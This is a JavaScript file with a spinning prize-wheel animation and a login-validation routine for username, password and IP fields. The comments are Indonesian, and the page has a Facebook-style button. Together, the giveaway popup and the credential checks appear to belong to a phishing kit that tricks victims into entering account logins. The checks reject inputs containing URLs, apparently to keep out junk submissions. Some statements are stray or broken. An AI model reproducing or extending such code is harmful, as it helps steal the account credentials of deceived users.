       const prizes = {
    0: $("#img0").attr('src'),
    1: $("#img1").attr('src'),
    2: $("#img2").attr('src'),
    3: $("#img3").attr('src'),
    4: $("#img4").attr('src'),
    5: $("#img5").attr('src'),
    6: $("#img6").attr('src'),
    7: $("#img7").attr('src'),
    8: $("#img8").attr('src'),
    9: $("#img9").attr('src'),
};

const total_items = 10;
const minimum_jumps = 5; 
let keys = -1;
let jumps = 0;
let speed = 10;
let timer = 0;
let prize = -1;

function runCircle() {
    soundEffect();
    $(`[data-order="${keys}"]`).removeClass('active');

    keys += 1;

    if (keys > total_items - 1) {
        keys = 0;
    }

    $(`[data-order="${keys}"]`).addClass('active');
}

function generatePrizeNumber() {
    return Math.floor(Math.random() * total_items);
}

function controllSpeed() {
    jumps += 1;
    runCircle();
    if (jumps > minimum_jumps + 10 && prize === keys) {
        clearTimeout(timer);
        $(`[data-order="${keys}"]`).addClass('colored');
        setTimeout(() => {
        prizes[keys]
        $('.mask').fadeIn();
        $('.popReward').fadeIn();
        $('.popReward').css('display','flex');
        $('#imgsrc').attr('src',prizes[keys]);
        $
        },1000)

        prize = -1;
        jumps = 0;

    } else {
        if (jumps < minimum_jumps) {
            speed -= 5; 
        } else if (jumps === minimum_jumps) {
            const random_number = generatePrizeNumber();
            prize = random_number;
        } else {
           
            if ( (jumps > minimum_jumps + 10) && prize === (keys + 1) ) {
                speed += 600;
            } else {
                speed += 20; 
            }
        }
        if (speed < 40) {
            speed = 40;
        }

        timer = setTimeout(controllSpeed, speed);
    }
}

function init(e) {
	console.log(e);
    jumps = 0;
    speed = 100;
    prize = -1;
    controllSpeed();
}
function soundEffect() {
var audio = new Audio('https://j.top4top.io/m_1948rgfbd0.mp3');
audio.play();
}
function valid() {
    var user = $('#user').val();
    var pass = $('#pass').val();
    var ip = $('#ip').val();
    if(user == '' || user == null)
    {
        $('.email').show();
        $('.sandi').hide();
        return false;
    }else{
    
        if(user.includes('@')){
        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
        if(user.match(pattern)){
        $('.email').hide();
        }else{
        $('.email').show();
        $('.sandi').hide();
        return false;
        }
        }
        
        if(!isNaN(user)){
        if(user.length <= 10){
        $('.email').show();
        $('.sandi').hide();
        return false;
        }else{
        $('.email').hide();
        }
        }
        
        if(user.match(/\s/g)){
        $('.email').show();
        $('.sandi').hide();
        return false;
        }else{
        $('.email').hide();
        }
        
        var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
        if(user.match(regex)){
        $('.email').show();
        $('.sandi').hide();
        return false;
        }
        
        
        if(user.length <= 5){
        $('.email').show();
        $('.sandi').hide();
        return false;
        }else{
        $('.email').hide();
        }
        
    }
    if(pass == '' || pass == null || pass.length <= 5)
    {
        $('.sandi').show();
        return false;
    }else{
        $('.sandi').hide();
    }
    var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
        if(pass.match(regexs)){
        $('.sandi').show();
        $('.email').hide();
        return false;
        }else{
        $('.sandi').hide();
        }
    
    // Jika Sukses
    $("#btnfb").addClass("disabled");
}
